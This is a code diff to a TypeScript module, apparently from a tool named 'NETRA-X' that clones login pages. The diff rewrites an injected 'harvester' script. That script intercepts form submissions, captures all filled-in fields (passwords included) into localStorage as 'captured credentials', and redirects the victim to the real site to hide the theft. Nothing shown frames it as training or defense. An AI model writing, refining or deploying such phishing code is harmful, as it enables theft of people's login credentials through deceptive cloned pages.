@@ -24,82 +24,55 @@ export type PageClonerOutput = z.infer<typeof PageClonerOutputSchema>;
 
 const getHarvesterScript = (redirectUrl: string) => `
 <script>
-  // This is the main function that captures form data.
-  function captureAndRedirect(formElement) {
-    if (!formElement || typeof formElement.querySelectorAll !== 'function') {
-      // Not a valid element, redirect to avoid breaking the user flow.
-      window.location.href = '${redirectUrl}';
-      return;
+    // This is the main function that captures form data.
+    function captureAndRedirect(form) {
+        try {
+            // Use FormData for robust capture of all form fields.
+            const formData = new FormData(form);
+            const credentials = {};
+            let capturedData = false;
+            
+            // Convert FormData to a plain object.
+            for (let [key, value] of formData.entries()) {
+                if (typeof value === 'string' && value.length > 0) {
+                    credentials[key] = value;
+                    capturedData = true;
+                }
+            }
+            
+            if (capturedData) {
+                const entry = {
+                    ...credentials,
+                    source: window.location.href,
+                    timestamp: new Date().toISOString()
+                };
+                const storageKey = 'netra-captured-credentials';
+
+                // Retrieve existing data, or initialize if it doesn't exist.
+                const existingData = JSON.parse(localStorage.getItem(storageKey) || '[]');
+                const updatedData = [...existingData, entry];
+                localStorage.setItem(storageKey, JSON.stringify(updatedData));
+            }
+        } catch (e) {
+            // Log error but do not interrupt the user's redirection.
+            console.error('NETRA-X Harvester: Error saving credentials to localStorage.', e);
+        } finally {
+            // Always redirect the user to the intended page.
+            // Use a small delay to ensure localStorage has time to save.
+            setTimeout(() => {
+                window.location.href = '${redirectUrl}';
+            }, 150);
+        }
     }
 
-    const credentials = {};
-    const inputs = formElement.querySelectorAll('input');
-    let capturedData = false;
-
-    // Capture all non-hidden inputs with a value.
-    inputs.forEach(input => {
-      if (input.type !== 'hidden' && input.value) {
-        // Use name, id, or type as the key in that order of preference.
-        const key = input.name || input.id || input.type;
-        credentials[key] = input.value;
-        capturedData = true;
-      }
-    });
-
-    if (capturedData) {
-      try {
-        const entry = {
-          ...credentials,
-          source: window.location.href,
-          timestamp: new Date().toISOString()
-        };
-        const storageKey = 'netra-captured-credentials';
-        // Retrieve existing data, or initialize if it doesn't exist.
-        const existingData = JSON.parse(localStorage.getItem(storageKey) || '[]');
-        // Add the new entry.
-        const updatedData = [...existingData, entry];
-        // Save back to localStorage.
-        localStorage.setItem(storageKey, JSON.stringify(updatedData));
-      } catch (e) {
-        // Log error but do not interrupt the user's redirection.
-        console.error('NETRA-X Harvester: Error saving credentials to localStorage.', e);
-      }
-    }
-    
-    // Redirect the user to the intended page.
-    // Use a small delay to ensure localStorage has time to save.
-    setTimeout(() => {
-      window.location.href = '${redirectUrl}';
-    }, 150);
-  }
-
-  // --- Event Listeners ---
-  // We use the 'capture: true' option to ensure our listeners run before any
-  // other scripts on the page can interfere or stop the event.
-
-  // 1. Intercept standard form submissions.
-  document.addEventListener('submit', function(e) {
-    const form = e.target;
-    // Prevent the form from actually submitting.
-    e.preventDefault();
-    e.stopPropagation();
-    captureAndRedirect(form);
-  }, true);
-
-  // 2. Intercept clicks on buttons that might trigger a JavaScript-based submission.
-  document.addEventListener('click', function(e) {
-    // Find the closest form associated with a clicked button.
-    const form = e.target.closest('form');
-    // We only act if the click was on a button or something that looks like one.
-    const isSubmitButton = e.target.type === 'submit' || e.target.tagName === 'BUTTON';
-
-    if (form && isSubmitButton) {
-      // Prevent any default click behavior and stop other scripts.
-      e.preventDefault();
-      e.stopPropagation();
-      captureAndRedirect(form);
-    }
-  }, true);
+    // We use the 'capture: true' option to ensure our listeners run before any
+    // other scripts on the page can interfere or stop the event.
+    document.addEventListener('submit', function(e) {
+        // Prevent the form from actually submitting.
+        e.preventDefault();
+        e.stopPropagation();
+        captureAndRedirect(e.target);
+    }, true);
 </script>
 `;
 
@@ -142,3 +115,4 @@ export async function cloneLoginPage(input: PageClonerInput): Promise<PageCloner
     throw new Error('An unknown error occurred during page cloning.');
   }
 }
+
